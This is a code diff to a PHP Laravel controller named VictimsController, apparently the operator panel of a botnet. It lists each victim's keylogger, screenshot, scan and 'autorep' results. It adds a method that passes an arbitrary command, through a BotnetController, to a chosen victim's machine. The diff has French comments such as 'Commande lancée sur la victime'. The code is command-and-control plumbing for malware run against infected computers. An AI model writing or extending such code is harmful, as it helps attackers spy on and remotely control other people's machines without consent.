@@ -87,11 +87,17 @@ class VictimsController extends Controller
             ->where('victim_attacks.type', 'keylogger')
             ->where('victim_attacks.state', 'done')
             ->get();
+
         // Récupérer les autorep de la victime
         $autoreps = VictimAttacks::where('victim_id', $victim->id)
             ->where('victim_attacks.type', 'autorep')
             ->get();
     
+        // Récupérer les commandes de la victime
+        $commands = VictimAttacks::where('victim_id', $victim->id)
+            ->where('victim_attacks.type', 'command')
+            ->get();
+
         return view('victims.show', [
             'username' => $username, 
             'name' => $name,
@@ -102,7 +108,8 @@ class VictimsController extends Controller
             'screenshots' => $screenshots,
             'scans' => $scans,
             'keyloggers' => $keyloggers,
-            'autoreps' => $autoreps
+            'autoreps' => $autoreps,
+            'commands' => $commands
         ]);
     }
     
@@ -223,5 +230,16 @@ class VictimsController extends Controller
         $record = (new BotnetController)->record($victim_uid);
 
         return redirect("/victims/$victim_id")->with('output', "Enregistrement lancé sur la victime.");
+    }
+
+    public function command(Request $request)
+    {
+        $victim_id = $request->victim_id;
+        $victim_uid = $request->victim_uid;
+        $value = $request->value;
+
+        $command = (new BotnetController)->command($victim_uid, $value);
+
+        return redirect("/victims/$victim_id")->with('output', "Commande lancée sur la victime.");
     }
 }
